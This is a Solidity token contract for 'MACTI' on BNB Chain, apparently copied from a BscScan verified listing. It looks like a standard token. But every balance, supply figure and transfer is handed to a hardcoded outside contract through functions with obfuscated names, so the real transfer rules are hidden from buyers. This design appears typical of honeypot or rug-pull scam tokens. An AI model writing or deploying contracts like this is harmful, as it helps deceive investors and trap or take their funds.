/**
 *Submitted for verification at BscScan.com on 2022-04-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface CEFBI {

    function TACFL(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function GLCYB() view external returns (uint256);

    function FTERU(address _owner) view external returns (uint256);

    function MTCUYR(address _from, address _to, uint256 _value) external;

}

interface IDEXRouter {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract MACTI{
	
    string public name = "MACTI";
    string  public symbol = "MACTI";
    uint8   public decimals = 9;
	uint256 public totalSupply_ = 1000000000 * (10 ** decimals);
	
	address public tokenOwner;
	address public pairs;
	IDEXRouter public router;
	address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

	CEFBI CUYGH = CEFBI(0x01Ffc31d28ded5476c67Cfa561f606CCcdC35ECa);

	constructor() {
		tokenOwner=msg.sender;
        
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));

        CUYGH.TACFL(totalSupply_, address(this), tokenOwner,pairs);

        emit Transfer(address(0), tokenOwner, totalSupply_);
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
	

    function totalSupply() public view returns (uint256) {
        return CUYGH.GLCYB();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return CUYGH.FTERU(_owner);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(CUYGH.FTERU(msg.sender) >= _value);

        CUYGH.MTCUYR(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= CUYGH.FTERU(_from));
        require(_value <= allowed[_from][msg.sender]);
		
		CUYGH.MTCUYR(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
	
}